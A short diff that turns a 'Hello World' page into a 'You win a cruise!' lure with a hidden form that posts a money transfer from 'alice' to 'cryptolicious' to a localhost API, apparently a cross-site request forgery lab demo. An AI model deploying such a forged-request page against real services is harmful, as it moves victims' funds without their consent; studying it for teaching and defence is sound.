@@ -1,5 +1,11 @@
 <!DOCTYPE html>
-<script src="index.js"></script>
 <body>
-    <h1>Hello World</h1>
+    <h1>You win a cruise!</h1>
+    <form action="http://localhost:8123/api/transfer" method="post" id="attackform">
+        <input type="hidden" name="from" value="alice" />
+        <input type="hidden" name="to" value="cryptolicious" />
+        <input type="hidden" name="amount" value="100" />
+        <input type="submit" value="Claim Now" />
+    </form>
+    <script src="index.js"></script>
 </body>
